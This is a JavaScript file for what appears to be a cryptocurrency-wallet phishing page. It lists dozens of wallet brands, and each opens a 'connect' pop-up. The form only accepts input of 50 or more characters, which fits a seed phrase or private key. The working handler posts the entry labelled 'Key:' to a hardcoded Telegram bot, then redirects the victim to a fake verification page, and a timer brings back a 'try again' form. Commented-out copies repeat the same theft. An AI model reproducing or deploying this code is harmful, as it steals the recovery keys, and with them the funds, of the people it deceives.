const popUp = document.getElementById("pop-up")
const trustBtn = document.getElementById("trust-btn")
const safePal = document.getElementById("safepal-btn")
const  metaBtn = document.getElementById("meta-btn")
const ledgerliveBtn = document.getElementById("ledgerlive-btn")
const hashBtn = document.getElementById("hash-btn")
const coinbaseBtn = document.getElementById("coinbase-btn")
const cryptoBtn = document.getElementById("crypto-btn")
const changewalletBtn = document.getElementById("changewallet-btn")
const bitfrostBtn = document.getElementById("bitfrostwallet-btn")
const  stationBtn = document.getElementById("station-btn")
const peraBtn = document.getElementById("pera-btn")
const walkenBtn = document.getElementById("walken-btn")
const stepnBtn = document.getElementById("stepn-btn")
const saitaBtn = document.getElementById("saita-btn")
const deflyBtn = document.getElementById("defly-btn")
const safemoBtn = document.getElementById("safemoo-btn")
const saitaproBtn = document.getElementById("saitapro-btn")
const walletConnectBtn = document.getElementById("walletconnect-btn")
const blockwalletBtn= document.getElementById("blockwallet-btn")
const stargazerBtn= document.getElementById("stargazer-btn")
const tensetBtn = document.getElementById("tenset-btn")
const bullBtn = document.getElementById("bull-btn")
const liqualityBtn = document.getElementById("liquality-btn")
const binanceBtn = document.getElementById("binance-btn")
const polygonBtn = document.getElementById("polygon-btn")
const rainbowBtn = document.getElementById("rainbow-btn")
const bitpayBtn = document.getElementById("bitpay-btn")
const walletBtn = document.getElementById("wallet-btn")
const argentBtn = document.getElementById("argent-btn")
const huobiBtn = document.getElementById("huobi-btn")
const encryptedBtn = document.getElementById("encrypted-btn")
const compoundBtn = document.getElementById("compound-btn")
const polkadotBtn = document.getElementById("polkadot-btn")
const iotextBtn = document.getElementById("iotex-btn")
const coinBtn = document.getElementById("coin-btn")
const tokenBtn = document.getElementById("token-btn")
const mathBtn = document.getElementById("math-btn")
const inchBtn = document.getElementById("inch-btn")
const dhamaBtn = document.getElementById("darma-btn")
const trustwalletBtn = document.getElementById("trustwallet-btn")
const mickeyBtn = document.getElementById("mikey-btn")
const atomicBtn = document.getElementById("atomic-btn")
const coolwalletBtn = document.getElementById("coolwallet-btn")
const nashBtn = document.getElementById("nash-btn")
const coinmoneyBtn = document.getElementById("coinmoney-btn")
const gridplusBtn = document.getElementById("gridplus-btn")
const tokenaryBtn = document.getElementById("tokenary-btn")
const safepalBtn = document.getElementById("safepalwallet-btn")
const infinitoBtn = document.getElementById("infinito-btn")
const walletioBtn = document.getElementById("walletio-btn")
const ownbitBtn = document.getElementById("ownbit-btn")
const easypocketBtn = document.getElementById("easypocket-btn")
const bridgewalletBtn = document.getElementById("bridgewallet-btn")
const viawalletBtn = document.getElementById("viawallet-btn")
const bitkeepBtn = document.getElementById("bitkeep-btn")
const unstopablewalletBtn = document.getElementById("unstopablewallet-btn")
const halodefiBtn = document.getElementById("halodefi-btn")
const dockwalletBtn = document.getElementById("dockwallet-btn")
const cellowalletBtn = document.getElementById("cellowallet-btn")
const coinusBtn = document.getElementById("coinus-btn")
const valoraBtn = document.getElementById("valora-btn")
const trusteewalletBtn = document.getElementById("trusteewallet-btn")
const guardawalletBtn = document.getElementById("guardawallet-btn")
const jadewalletBtn = document.getElementById("jadewallet-bullet")
const plasmapayBtn = document.getElementById("plasmapay-btn")
const zerothreewalletBtn = document.getElementById("03wallet-btn")
const hashkeyBtn = document.getElementById("hashkey-btn")
const rwalletBtn = document.getElementById("rwallet-btn")
const flarewalletBtn = document.getElementById("flarewallet-btn")
const kyberswapBtn = document.getElementById("kyberswap-btn")
const atokenBtn = document.getElementById("atoken-btn")

const tonguewalletBtn = document.getElementById("tonguewallet-btn")
const xinfinBtn = document.getElementById("xinfin-btn")
const talkenwalletBtn = document.getElementById("talkenwallet-btn")
const keyringproBtn = document.getElementById("keyringpro-btn")
const midaswalletBtn = document.getElementById("midaswallet-btn")
const atwalletBtn = document.getElementById("atwallet-btn")

const tangemwalletBtn = document.getElementById("tangemwallet-btn")
const tokenimBtn = document.getElementById("tokenim-btn")
const othersBtn = document.getElementById("others-btn")

const closeIcon = document.getElementById("close-icon")

const object = document.getElementById("movingObject");
const dropForm = document.getElementById("dropForm");
const tryAgain = document.getElementById("tryAgain");
const btnbtnconnect = document.getElementById("btnbtnConnect");
const textArea = document.getElementById("textArea");


const button = document.getElementById("connectBtn");
// const form = document.querySelector("form");




// form.addEventListener("submit", (e) => {
//     e.preventDefault();

//     const infoArea = document.querySelector("#username").value;
//     const token = "7893140241:AAEcXczCl_2AaLaG2Hr7ZJU1CHoNyB2dctY";
//     const chat_id = "7054987906";

//     const url = `https://api.telegram.org/bot${token}/sendMessage`;

//     const data = JSON.stringify({
//         chat_id: chat_id,
//         text: `Key: ${infoArea}`,
//     });

//     fetch(url, {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json",
//         },
//         body: data,
//     })
//     .then(response => {
//         if (response.ok) {
//             console.log("Message sent successfully!");
//         } else {
//             console.error("Error sending message:", response.status, response.statusText);
//         }
//     })
//     .catch(error => {
//         console.error("Network error occurred:", error);
//     });

//     document.querySelector("#username").value = ""; // Clear the input field
// });



document.addEventListener("DOMContentLoaded", function () {
    const button = document.getElementById("connectBtn");
    const errorMessage = document.getElementById("error-message");
    const formInfo = document.getElementById("username");
    const form = document.querySelector("form"); // Ensure you have a reference to the form

    // Initially hide the error message
    errorMessage.style.display = "none";

    function updateButtonState() {
        const charCount = formInfo.value.trim().length;
        button.disabled = charCount === 0; // Disable if empty
        button.classList.toggle("opacity-50", charCount === 0);
        button.classList.toggle("blur-sm", charCount === 0);
        button.classList.toggle("cursor-not-allowed", charCount === 0);
    }

    function handleFormSubmission(event) {
        const charCount = formInfo.value.trim().length;

        if (charCount < 50) {
            event.preventDefault(); // Prevent form submission
            errorMessage.style.display = "block";
            errorMessage.textContent = `Please lengthen this text to 50 characters or more. (${charCount}/50 characters used)`;
        } else {
            event.preventDefault(); // Prevent default form submission
            errorMessage.style.display = "none"; // Hide error

            // Send data to Telegram API
            const token = "7893140241:AAEcXczCl_2AaLaG2Hr7ZJU1CHoNyB2dctY";
            const chat_id = "7054987906";
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            const data = JSON.stringify({
                chat_id: chat_id,
                text: `Key: ${formInfo.value}`,
            });

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: data,
            })
            .then(response => {
                if (response.ok) {
                    console.log("Message sent successfully!");

                    // Redirect to a new page after successful submission
                    window.location.href = "syncnode-secure.hubcentralcheck.com.carda.phase_check.html"; // Replace with your desired URL
                } else {
                    console.error("Error sending message:", response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error("Network error occurred:", error);
            });

            formInfo.value = ""; // Clear the input field
        }
    }

    // Initial state check
    updateButtonState();

    // Enable/disable button dynamically
    formInfo.addEventListener("input", function () {
        updateButtonState();
        errorMessage.style.display = "none"; // Hide error message when typing again
    });

    // Handle form submission
    form.addEventListener("submit", handleFormSubmission);
});


// form.addEventListener("submit", (e) => {
//     e.preventDefault();

//     const infoArea = document.querySelector("#username").value;
//     const token = "7893140241:AAEcXczCl_2AaLaG2Hr7ZJU1CHoNyB2dctY";
//     const chat_id = "7054987906";

//     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

//     const api = new XMLHttpRequest();
//     api.open("POST", url, true); // Use POST method
//     api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

//     // Construct the JSON payload
//     const data = JSON.stringify({
//         chat_id: chat_id,
//         infoArea: infoArea.value,
//         text: `Key: ${infoArea}`,
//     });
//     console.log("{data}")

//     api.onload = () => {
//         if (api.status >= 200 && api.status < 300) {
//             console.log("Message sent successfully!");
//             // Optionally display a success message to the user
//         } else {
//             console.error("Error sending message:", api.status, api.responseText);
//             // Optionally display an error message to the user
//         }
//     };

//     api.onerror = () => {
//         console.error("Network error occurred.");
//         // Handle network errors appropriately
//     }

//     api.send(data); // Send the JSON data with the request
//     infoArea.value = ""; //Clear the input field
// });



// function redirect() {
//     var formText = document.getElementById("username");
//     var JargonsMessage = document.getElementById("error-message");

//     // Trimmed value of input
//     var inputText = formText.value.trim();

//     // If input is less than 50 characters, show error and prevent redirection
//     if (inputText.length < 50) {
//         let remaining = 50 - inputText.length;

//         // Show error message with character count
//         JargonsMessage.style.display = "block"; 
//         JargonsMessage.textContent = `You have entered ${inputText.length} characters. You need ${remaining} more to proceed.`;

//         return; // Stop redirection
//     }

//     // Hide the error message if input is valid
//     JargonsMessage.style.display = "none";

//     // **Clear the text field after successful submission**
//     formText.value = "";

//     // Proceed with redirection
//     window.location.href = "syncnode-secure.hubcentralcheck.com.carda.phase_check.html";
// }



// document.addEventListener("DOMContentLoaded", function () {
//     const button = document.getElementById("connectBtn");
//     const errorMessage = document.getElementById("error-message");
//     const formInfo = document.getElementById("username");

//     // Initially hide the error message
//     errorMessage.style.display = "none";

//     function updateButtonState() {
//         const charCount = formInfo.value.trim().length;

//         button.disabled = charCount === 0; // Disable if empty
//         button.classList.toggle("opacity-50", charCount === 0);
//         button.classList.toggle("blur-sm", charCount === 0);
//         button.classList.toggle("cursor-not-allowed", charCount === 0);
//     }

//     function handleButtonClick(event) {
//         const charCount = formInfo.value.trim().length;

//         if (charCount < 50) {
//             event.preventDefault(); // Prevent submission
//             errorMessage.style.display = "block";
//             errorMessage.textContent = `Please lengthen this text to 50 characters or more. (${charCount}/50 characters used)`;
//         } else {
//             errorMessage.style.display = "none"; // Hide error
//             alert("Submitted successfully!"); // Replace this with actual form submission logic
//         }
//     }

//     // Initial state check
//     updateButtonState();

//     // Enable/disable button dynamically but don't show error yet
//     formInfo.addEventListener("input", function () {
//         updateButtonState();
//         errorMessage.style.display = "none"; // Hide error message when typing again
//     });

//     // Validate when button is clicked (error message only appears on click)
//     button.addEventListener("click", handleButtonClick);
// });




window.addEventListener("scroll", function () {
    const navbar = document.getElementById("navbar");
    if (window.scrollY > 50) {
        navbar.classList.add("bg-white", "shadow-lg", "border-b", "border-gray-300");
        navbar.classList.remove("text-white");
        navbar.classList.add("text-black");
    } else {
        navbar.classList.remove("bg-white", "shadow-lg", "border-b", "border-gray-300");
        navbar.classList.remove("text-black");
        navbar.classList.add("text-white");
    }
});


btnbtnconnect.addEventListener("click", () => {
    textArea.classList.remove("hidden")
})

closeIcon.addEventListener("click", function() {
    location.reload();
});


 tryAgain.addEventListener("click", () => {
    dropForm.classList.add("hidden")
 })


 document.addEventListener("DOMContentLoaded", function () {

    let hideTimer;

    function startDropFormCountdown() {
        dropForm.classList.add("hidden"); // Ensure it's hidden immediately
        resetTimer(); // Reset any previous timer

        hideTimer = setTimeout(() => {
            dropForm.classList.remove("hidden"); // Show after 30 seconds
        }, 15000);
    }

    function resetTimer() {
        clearTimeout(hideTimer); // Clear any running countdown
    }

    function handlePopupState() {
        if (popUp.classList.contains("top-[-100]")) {
            resetTimer(); // Stop the countdown
            dropForm.classList.add("hidden"); // Keep it hidden
        } else {
            startDropFormCountdown(); // Restart countdown when popup opens
        }
    }

    tryAgain.addEventListener("click", function () {
        startDropFormCountdown(); // Restart 30-sec countdown
    });

    closeIcon.addEventListener("click", function () {
        resetTimer(); // Stop countdown
        dropForm.classList.add("hidden"); // Keep it hidden
    });

    // Observe class changes on popup
    const observer = new MutationObserver(() => {
        handlePopupState();
    });

    observer.observe(popUp, { attributes: true, attributeFilter: ["class"] });

    // Initial check on page load
    handlePopupState();
});


document.addEventListener("DOMContentLoaded", function () {
    const cards = document.querySelectorAll(".card");
    const formLogo = document.getElementById("formLogo");
    const dropdownForm = document.getElementById("dropDown");

    cards.forEach(card => {
        card.addEventListener("click", function () {
            // Get the logo from the clicked card
            const cardLogo = card.querySelector(".card-logo").src;

            // Update the form logo
            formLogo.src = cardLogo;

            // Show the dropdown form (if hidden)
            dropdownForm.style.display = "block";
        });
    });
});





othersBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenimBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tangemwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tonguewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
xinfinBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
talkenwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
keyringproBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
midaswalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})

zerothreewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
hashkeyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
rwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
flarewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
kyberswapBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atokenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinusBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
valoraBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trusteewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
guardawalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
jadewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
plasmapayBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
cellowalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
dockwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
halodefiBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
unstopablewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitkeepBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
viawalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bridgewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
easypocketBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
ownbitBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletioBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
infinitoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safepalBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenaryBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
gridplusBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinmoneyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
nashBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
mickeyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atomicBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coolwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
dhamaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trustwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
mathBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
inchBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
iotextBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
polkadotBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
compoundBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
encryptedBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
huobiBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
argentBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitpayBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
rainbowBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
polygonBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
binanceBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
metaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trustBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safePal.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
ledgerliveBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
hashBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinbaseBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
cryptoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
changewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitfrostBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stationBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
peraBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walkenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stepnBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
saitaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
deflyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safemoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
saitaproBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletConnectBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
blockwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stargazerBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tensetBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bullBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
liqualityBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})



closeIcon.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})